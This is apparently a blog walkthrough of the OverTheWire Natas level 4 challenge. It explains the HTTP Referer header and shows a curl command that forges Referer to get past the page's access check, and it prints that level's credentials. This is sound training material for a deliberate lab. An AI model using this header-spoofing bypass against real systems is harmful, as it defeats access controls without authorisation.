---
title: OverTheWire Natas Level 3 -> 4
author: Michael McDonagh
pubDatetime: 2025-03-02T20:30:00Z
slug: overthewire-natas-4
featured: false
draft: false
tags:
  - overthewire
  - natas
  - web
ogImage: ""
description: Solution for OverTheWire Natas level 4 challenge.
---

## Description

Username: natas4  

URL:      <http://natas4.natas.labs.overthewire.org>

---

## Solution

Solution for the Overthewire.org [Natas level 3 -> Level 4](https://overthewire.org/wargames/natas/natas4.html)

Visit the url `http://natas4.natas.labs.overthewire.org` in the browser and we get a prompt for login.

Use the username `natas4` and the password obtained from the previous challenge.

After logging in we get a message saying "Access disallowed".

![natas04 home page](@/assets/images/overthewire/natas/natas04_home_page.png)

The message further goes on to say that authorized users need to come from "<http://natas5.natas.labs.overthewire.org>"

Checking the source code of the page does not give any new information.

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Going back to the message, how does the browser know what page we came from ?  
Information like that is passed in the `http header`.  
The Mozilla developer site is a good resource for checking what headers are available. [Mozilla Developer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers).  

After reading through the headers we find what we are looking for.

```text
Referer: The address of the previous web page from which a link to the currently requested page was followed.
```

The `Referer` header tells the page we visit where we came from.

So now we need to send a request to the natas4 page while setting our own `referer` value. We can do this using a command line tool `curl`.

`curl` is a tool for transferring data from or to a server and supports user authentication, cookies and setting header values.

User this curl command we get the password.

```bash
curl --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
```

* `curl`
* `--user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ` --authentication using username:password format
* `--referer http://natas5.natas.labs.overthewire.org/` --set the referer header to the natas5 url
* `http://natas4.natas.labs.overthewire.org/` the url we are visting.

Since `curl` is a command line program we get the html source code back.

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOf**************************
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Assuming the correct referer is set we get the password.

```text
Access granted. The password for natas5 is iX6IOf**************************
```
